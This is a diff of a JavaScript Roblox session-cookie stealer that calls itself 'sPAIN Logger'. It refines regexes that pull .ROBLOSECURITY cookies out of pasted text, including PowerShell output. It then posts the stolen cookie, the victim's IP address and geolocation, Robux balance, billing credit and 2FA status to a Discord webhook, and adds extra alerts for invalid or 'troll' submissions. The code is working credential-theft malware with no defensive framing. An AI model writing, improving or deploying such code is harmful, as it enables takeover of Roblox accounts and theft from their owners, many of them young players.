@@ -39,20 +39,27 @@ async function getIpGeo(ip) {
 
 function extractRobloxCookie(raw) {
   if (!raw) return null;
-  const cleaned = raw.trim().replace(/\s+/g, ' ');
-  
-  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
+
+  // Full cookie with WARNING prefix already intact
+  const fullMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^\s"']+)/);
   if (fullMatch) return fullMatch[1];
-  
-  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
+
+  // Cookie buried in powershell/text — grab WARNING prefix + token after |_
+  const psMatch = raw.match(/\.ROBLOSECURITY[^_]*(_\|WARNING[^\s"']+)/);
+  if (psMatch) return psMatch[1];
+
+  // WARNING prefix with token after |_
+  const warningMatch = raw.match(/_\|WARNING[^|]*\|_([\w\-.]{50,})/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
-  
-  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
+
+  // Just the token after |_
+  const tokenOnly = raw.match(/\|_([\w\-.]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
-  
-  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
+
+  // Bare long base64-like string (no prefix at all)
+  const bareToken = raw.trim().match(/^([A-Za-z0-9\-_\.]{200,})$/);
   if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
-  
+
   return null;
 }
 
@@ -180,61 +187,102 @@ function field(name, value, inline = true) {
 }
 
 async function sendToDiscord(webhookUrl, data) {
-  if (!webhookUrl) {
-    console.error('No webhook URL');
-    return false;
-  }
-  
+  if (!webhookUrl) { console.error('No webhook URL'); return false; }
   if (!webhookUrl.includes('discord.com/api/webhooks') && !webhookUrl.includes('discordapp.com/api/webhooks')) {
-    console.error('Invalid webhook URL');
-    return false;
+    console.error('Invalid webhook URL'); return false;
   }
 
   const { rawValue, cookie, roblox, ip, geo, now } = data;
-  
   const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
-  
-  // Build compact fields like the screenshot
+
+  // ── TROLL / INVALID COOKIE EMBED ─────────────────────────────────────────
+  if (cookie && !roblox) {
+    const trollPayload = {
+      content: '@everyone',
+      embeds: [{
+        title: '⚠️ Wrong Cookie / Troll Detected',
+        description: ':rotating_light: `Someone pasted an invalid or expired cookie` :rotating_light:',
+        color: 0xff0000,
+        fields: [
+          field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
+          field('🌐 IP Address', ip || 'Unknown', true),
+          field('📅 Date', now, false),
+          field('🗑️ Bad Cookie', `\`\`\`${cleanCookie.substring(0, 500)}\`\`\``, false),
+        ],
+        footer: { text: 'sPAIN Logger • Invalid Submission' },
+        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
+      }]
+    };
+    try {
+      const r = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(trollPayload) });
+      return r.ok;
+    } catch (_) { return false; }
+  }
+
+  // ── NO COOKIE AT ALL ─────────────────────────────────────────────────────
+  if (!roblox) {
+    const noPayload = {
+      content: '@everyone',
+      embeds: [{
+        title: '🤡 Troll / No Cookie Detected',
+        description: ':rotating_light: `Someone submitted without a valid Roblox cookie` :rotating_light:',
+        color: 0xff6600,
+        fields: [
+          field('📥 Pasted', rawValue?.substring(0, 500) || '(empty)', false),
+          field('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.regionName || ''}, ${geo?.country || 'Unknown'}`, true),
+          field('🌐 IP Address', ip || 'Unknown', true),
+          field('📅 Date', now, false),
+        ],
+        footer: { text: 'sPAIN Logger • Troll Submission' },
+        thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
+      }]
+    };
+    try {
+      const r = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(noPayload) });
+      return r.ok;
+    } catch (_) { return false; }
+  }
+
+  // ── VALID ROBLOX ACCOUNT ─────────────────────────────────────────────────
   const fields = [
-    // Row 1: Robux | Rap | Summary
-    field("🔴 Robux", `Balance: ${roblox?.robux?.toLocaleString() || 0}\nPending: ${roblox?.pendingRobux || 0}`, true),
-    field("🎵 Rap", `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox?.limitedsCount || 0}`, true),
+    field("🔴 Robux", `Balance: ${roblox?.robux?.toLocaleString() || 0}
+Pending: ${roblox?.pendingRobux || 0}`, true),
+    field("🎵 Rap", `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}
+Owned: ${roblox?.limitedsCount || 0}`, true),
     field("📊 Summary", `${roblox?.accountAgeDays || 'N/A'} Days`, true),
-    
-    // Row 2: Billing | Passes | Settings
-    field("💳 Billing", `Credit: ${roblox?.credit || 0} USD\nConvert: 0`, true),
-    field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
-    field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`, true),
-    
-    // Row 3: Groups | Location | IP
-    field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`, true),
+    field("💳 Billing", `Credit: ${roblox?.credit || 0} USD
+Convert: 0`, true),
+    field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}
+Verified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
+    field("⚙️ Settings", `Email: ${roblox?.emailSet}
+2FA: ${roblox?.twoFA}`, true),
+    field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}
+Owned: ${roblox?.groupsOwned || 0}`, true),
     field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
     field("🌐 IP", ip || 'Unknown', true),
-    
-    // Gamepasses section (full width)
-    field("🎮 [EXTRA] Passes | Played", 
-      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}\n` +
-      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}\n` +
-      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`, 
+    field("🎮 [EXTRA] Passes | Played",
+      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}
+` +
+      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}
+` +
+      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`,
       false
     ),
-    
-    // 2FA Notification
     field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
-    
-    // Cookie (full width, no newlines in code block)
     field("🔐 .ROBLOSECURITY", `\`\`\`${cleanCookie}\`\`\``, false)
   ];
 
   const payload = {
     content: "@everyone",
     embeds: [{
-      title: roblox ? `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}` : "🧑 New Login",
-      description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox?.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
+      title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
+      description: `:fire: \`sPAIN\` :fire:
+
+[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
       color: 5793266,
       fields: fields,
       footer: { text: `sPAIN Logger • ${now}` },
-      thumbnail: { url: roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
+      thumbnail: { url: roblox.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
     }]
   };
 
